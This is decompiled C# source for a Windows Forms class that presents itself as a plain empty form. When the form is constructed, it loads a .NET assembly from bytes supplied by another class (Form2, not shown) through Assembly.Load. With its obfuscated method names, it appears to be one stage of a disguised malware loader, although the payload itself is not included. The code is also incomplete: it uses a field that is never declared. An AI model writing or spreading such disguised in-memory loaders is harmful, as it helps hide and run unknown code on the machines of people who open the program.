using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Saslmg;

public class Form3 : Form
{
	private IContainer _Parameter = null;

	[SpecialName]
	[CompilerGenerated]
	internal Assembly ConcatProperty()
	{
		return _Exception;
	}

	[SpecialName]
	[CompilerGenerated]
	internal void ChangeProperty(Assembly asset)
	{
		_Exception = asset;
	}

	public Form3()
	{
		ForgotProperty();
		SortProperty();
	}

	internal void SortProperty()
	{
		ChangeProperty(Assembly.Load(new Form2().ViewProperty()));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && _Parameter != null)
		{
			_Parameter.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void ForgotProperty()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).set_Name("Form3");
		((Control)this).set_Text("Form3");
		((Control)this).ResumeLayout(false);
	}
}
